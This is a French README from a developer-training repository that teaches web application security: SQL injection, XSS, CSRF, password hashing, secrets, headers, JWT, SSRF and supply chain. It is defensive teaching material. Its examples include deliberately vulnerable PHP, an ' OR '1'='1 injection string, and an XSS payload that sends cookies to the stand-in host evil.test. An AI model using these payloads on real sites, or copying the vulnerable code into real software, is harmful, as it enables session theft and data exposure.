# Security

## 1. Introduction

La sécurité applicative est **transverse** : contrairement aux autres dossiers de ce repo, elle ne correspond pas à un langage ou un framework unique. Les frameworks déjà couverts (Laravel, Symfony, Django, WordPress) embarquent déjà des protections par défaut (CSRF automatique, échappement de templates, hachage de mot de passe) — ce dossier explique le **pourquoi** derrière ces mécanismes et les vulnérabilités qu'ils préviennent, pour ne jamais les traiter comme de la magie qu'on désactive sans comprendre les conséquences.

**À quoi sert-elle ?**
- Protéger la confidentialité, l'intégrité et la disponibilité des données et du service.
- Réduire la surface d'attaque et limiter l'impact d'une faille quand elle survient (défense en profondeur).

**Où se situe-t-elle ?** Partout : côté client (XSS, stockage de tokens), côté serveur (injection, authentification, autorisation), et côté infrastructure (secrets, headers, dépendances). Ce n'est pas une couche qu'on ajoute à la fin, mais une préoccupation à intégrer dès la conception (*security by design*).

**Enjeux** : la sécurité est un processus continu, pas un état atteint une fois pour toutes — de nouvelles vulnérabilités (CVE) sont découvertes en continu dans les dépendances utilisées.
**Pièges courants** : considérer la sécurité comme la responsabilité d'un tiers (l'équipe infra, un pentest annuel) plutôt que de chaque développeur ; corriger après un incident plutôt que de valider en amont ; ne jamais auditer ses dépendances.

## 2. Prérequis

- Bases HTTP (requêtes/réponses, headers, cookies) — voir [`../html/`](../html/).
- Un langage backend pratiqué (PHP, Node.js, Python, Java) pour suivre les exemples de code.
- Notions SQL de base pour comprendre l'injection — voir [`../mysql/`](../mysql/).

## 3. Rappel des bases 🟢

### 01 - OWASP Top 10 (vue d'ensemble)

**Explication** — L'[OWASP Top 10](https://owasp.org/www-project-top-ten/) référence les catégories de vulnérabilités web les plus critiques et les plus fréquentes, revues périodiquement par la communauté sécurité. Les catégories couvertes en détail dans ce dossier : Broken Access Control, Cryptographic Failures, Injection, Identification and Authentication Failures, Security Misconfiguration, Vulnerable and Outdated Components.

**Bonne pratique** : utiliser cette liste comme checklist de revue de code et de conception, pas comme une liste à cocher une fois par an.

### 02 - Injection SQL

**Explication** — Une injection SQL survient quand une entrée utilisateur est concaténée directement dans une requête SQL, permettant à un attaquant d'en altérer la structure.

```php
// ❌ Vulnérable : l'entrée utilisateur est concaténée directement
$result = $pdo->query("SELECT * FROM users WHERE email = '$email'");
// email = "' OR '1'='1" retourne tous les utilisateurs

// ✅ Requête préparée : la valeur est liée, jamais interprétée comme du SQL
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute(['email' => $email]);
```

**Bonne pratique** : utiliser systématiquement des requêtes préparées (ou l'ORM du framework, qui les génère déjà) — ne **jamais** construire une requête SQL par concaténation de chaînes, quel que soit le langage.

### 03 - XSS (Cross-Site Scripting)

**Explication** — Une faille XSS permet à un attaquant d'injecter du JavaScript exécuté dans le navigateur d'une victime. On distingue le **XSS stocké** (le script malveillant est enregistré en base et rejoué à chaque affichage — ex. un commentaire non échappé) et le **XSS réfléchi** (le script provient directement d'un paramètre de la requête courante, ex. un résultat de recherche affiché tel quel).

```php
// ❌ Vulnérable : la donnée utilisateur est injectée telle quelle dans le HTML
echo "<p>Bonjour " . $_GET['name'] . "</p>";
// ?name=<script>document.location='https://evil.test?c='+document.cookie</script>

// ✅ Échappement systématique à l'affichage
echo "<p>Bonjour " . htmlspecialchars($_GET['name'], ENT_QUOTES) . "</p>";
```

**Bonne pratique** : échapper **toute** donnée dynamique au moment de l'affichage, selon le contexte de sortie (HTML, attribut, URL, JavaScript) — les moteurs de template modernes (Blade, Twig, JSX) le font automatiquement par défaut, ne jamais désactiver cet échappement sans raison forte et validée.

### 04 - CSRF (Cross-Site Request Forgery)

**Explication** — Une attaque CSRF force le navigateur d'une victime déjà authentifiée à exécuter une action non désirée (ex. changer son email) sur un site tiers, en s'appuyant sur l'envoi automatique des cookies de session par le navigateur.

```html
<!-- Formulaire protégé par un token CSRF unique, lié à la session -->
<form method="POST" action="/account/email">
    <input type="hidden" name="_token" value="{{ csrf_token() }}">
    <input type="email" name="email">
</form>
```

**Erreur fréquente** : protéger les formulaires HTML mais oublier les endpoints API appelés en `fetch`/`XMLHttpRequest` qui utilisent l'authentification par cookie — ils sont tout autant vulnérables et doivent porter le même token (souvent via un header custom).

### 05 - Hachage des mots de passe

**Explication** — Un mot de passe ne doit **jamais** être stocké en clair ni avec un hachage rapide non salé (MD5, SHA1) — ces algorithmes sont conçus pour être rapides, donc faciles à casser par force brute (rainbow tables, GPU cracking). Les algorithmes adaptés au mot de passe (bcrypt, Argon2) sont volontairement lents et intègrent un sel unique par mot de passe.

```php
$hash = password_hash($plainPassword, PASSWORD_BCRYPT); // à stocker en base
$isValid = password_verify($plainPassword, $hash);       // à la connexion
```

**Erreur fréquente** : utiliser `md5($password)` ou `sha1($password)` — ces fonctions sont pensées pour l'intégrité de fichiers, pas pour la protection de secrets, et ne sont pas assez lentes pour résister au brute force moderne.

### 06 - Gestion des secrets

**Explication** — Clés d'API, mots de passe de base de données et autres secrets ne doivent jamais être écrits en dur dans le code source ni commités dans Git — ils vivent dans des variables d'environnement (`.env`, exclu via `.gitignore`) ou un gestionnaire de secrets dédié (Vault, AWS Secrets Manager) en production.

**Erreur fréquente** : commiter un fichier `.env` par erreur — même supprimé dans un commit ultérieur, le secret reste visible dans l'historique Git et doit être considéré comme compromis (il faut le révoquer, pas seulement le supprimer du fichier).

### 07 - Validation et sanitization des entrées

**Explication** — Ne jamais faire confiance à une donnée venant du client (formulaire, paramètre d'URL, header, JSON). Valider selon une **liste blanche** (ce qui est autorisé — format, longueur, type) plutôt qu'une liste noire (ce qui est interdit), plus facile à contourner.

**Bonne pratique** : valider côté serveur systématiquement, même si une validation côté client existe déjà (elle n'est qu'un confort UX, jamais une protection — un attaquant peut appeler l'API directement).

## 4. Concepts intermédiaires 🟡

- **Authentication vs Authorization** : l'authentification répond à "qui es-tu ?" (login/mot de passe, token), l'autorisation répond à "as-tu le droit de faire ça ?" (rôles, permissions). Une faille de type *Broken Access Control* survient quand l'authentification est correcte mais que l'autorisation n'est pas vérifiée sur chaque ressource (ex. accéder à `/orders/124` alors que la commande appartient à un autre utilisateur).
- **Cookies de session sécurisés** : attributs `HttpOnly` (inaccessible en JavaScript, protège contre le vol par XSS), `Secure` (envoyé uniquement en HTTPS), `SameSite=Lax`/`Strict` (limite l'envoi automatique du cookie lors d'une requête cross-site, réduit la surface CSRF).
- **Rate limiting et protection brute-force** : limiter le nombre de tentatives de connexion par IP/compte dans une fenêtre de temps, avec verrouillage temporaire ou CAPTCHA après échecs répétés.
- **Security headers** : `Content-Security-Policy` (restreint les sources de scripts/styles autorisées, limite l'impact d'un XSS), `Strict-Transport-Security` (force HTTPS), `X-Content-Type-Options: nosniff`, `X-Frame-Options`/`frame-ancestors` (protège du clickjacking).
- **Scan de vulnérabilités des dépendances** : `composer audit`, `npm audit`, ou des outils automatisés (Dependabot, Snyk) qui alertent quand une dépendance utilisée a une CVE connue — la majorité des failles en production viennent d'une dépendance obsolète, pas du code applicatif lui-même.
- **Principe du moindre privilège** : chaque compte (utilisateur applicatif, compte de service, utilisateur base de données) ne doit avoir que les permissions strictement nécessaires à son usage — un compte MySQL applicatif n'a par exemple aucune raison d'avoir le droit `DROP TABLE`.

## 5. Concepts avancés 🟠🔴

- **JWT — pièges courants** : où stocker le token (un `localStorage` est lisible par tout script, donc vulnérable au XSS — un cookie `HttpOnly` est préférable), gestion de l'expiration et absence de révocation native (un JWT reste valide jusqu'à expiration même si le compte est désactivé, sauf mécanisme de liste de révocation additionnel), attaque *algorithm confusion* (`alg: none` ou confusion HS256/RS256 si le serveur ne force pas l'algorithme attendu).
- **OAuth2 — vue d'ensemble des flows** : *Authorization Code* (avec PKCE pour les clients publics) pour une authentification déléguée sécurisée, *Client Credentials* pour une communication serveur-à-serveur — voir [`../api/`](../api/) pour le détail des échanges.
- **SSRF (Server-Side Request Forgery)** : un serveur est trompé pour effectuer une requête vers une ressource interne normalement inaccessible (ex. un champ "URL d'avatar" pointé vers `http://169.254.169.254/` pour lire les métadonnées cloud) — se protéger en validant/restreignant les hôtes cibles autorisés côté serveur.
- **Supply chain security** : *dependency confusion* (publier un paquet public au même nom qu'un paquet privé interne pour le faire installer par erreur), importance des lockfiles (`composer.lock`, `package-lock.json`) pour figer des versions auditées plutôt que de laisser une plage de versions se résoudre différemment à chaque install.
- **Logging et détection** : journaliser les événements sensibles (échecs de connexion, changements de permissions) sans jamais logger de secrets en clair (mots de passe, tokens) ; mettre en place une alerte sur des patterns anormaux (pic d'échecs de connexion, requêtes en masse).
- **Zero trust** : ne jamais faire confiance implicitement à une requête au seul motif qu'elle vient du réseau interne — chaque requête est authentifiée et autorisée indépendamment de son origine.

## 6. Commandes / syntaxe à connaître

```bash
composer audit          # scanner les vulnérabilités connues des dépendances PHP
npm audit                # équivalent pour les dépendances Node.js
npm audit fix             # applique les correctifs disponibles automatiquement
```

```php
$hash = password_hash($password, PASSWORD_BCRYPT);
password_verify($password, $hash);
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
```

## 7. Exercices

Trois niveaux progressifs, énoncés dans [`exercices/`](exercices/), corrections séparées dans [`solutions/`](solutions/) (à consulter seulement après avoir cherché) :

- [Niveau 1 — Bases](exercices/niveau-1.md)
- [Niveau 2 — Intermédiaire](exercices/niveau-2.md)
- [Niveau 3 — Avancé](exercices/niveau-3.md)

## 8. Mini-projet

**Audit et durcissement d'une mini API de login**

Une petite API de connexion (fournie volontairement vulnérable dans l'énoncé de l'exercice niveau 3) cumule plusieurs failles : injection SQL, mot de passe stocké en clair, absence de protection CSRF sur le changement d'email, aucune limite de tentatives de connexion. À partir de ce code :
- Corriger l'injection SQL avec des requêtes préparées.
- Remplacer le stockage en clair par `password_hash`/`password_verify`.
- Ajouter la protection CSRF sur les endpoints qui modifient une donnée.
- Ajouter un rate limiting simple (compteur en mémoire ou Redis — voir [`../redis/`](../redis/)) sur l'endpoint de connexion.
- Ajouter les headers de sécurité de base (`Content-Security-Policy`, `X-Content-Type-Options`).
- Bonus : écrire un test qui vérifie que l'injection SQL initiale échoue désormais (voir [`../testing/`](../testing/)).

## Checklist

- [ ] Comprendre les fondamentaux (OWASP Top 10, injection, XSS, CSRF)
- [ ] Savoir reconnaître une requête SQL vulnérable dans du code existant
- [ ] Maîtriser le hachage de mot de passe (bcrypt/Argon2) et la gestion des secrets
- [ ] Comprendre les concepts importants (auth vs autorisation, cookies sécurisés, rate limiting)
- [ ] Savoir mettre en place les headers de sécurité de base
- [ ] Connaître les bonnes pratiques (validation liste blanche, moindre privilège, audit des dépendances)
- [ ] Réaliser les exercices (niveaux 1 à 3)
- [ ] Réaliser le mini-projet
- [ ] Comprendre les notions avancées (JWT, OAuth2, SSRF, supply chain)

## 10. Ressources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — référence des risques applicatifs les plus critiques.
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) — fiches pratiques par sujet (injection, XSS, auth, sessions...).
- [roadmap.sh — Cyber Security](https://roadmap.sh/cyber-security) — vue d'ensemble complémentaire côté réseau/infra (le présent dossier reste centré sécurité applicative).
- Sections sécurité déjà abordées dans [`../laravel/`](../laravel/), [`../symfony/`](../symfony/), [`../wordpress/`](../wordpress/), [`../django/`](../django/) — mécanismes concrets d'un framework donné, en écho aux principes génériques vus ici.
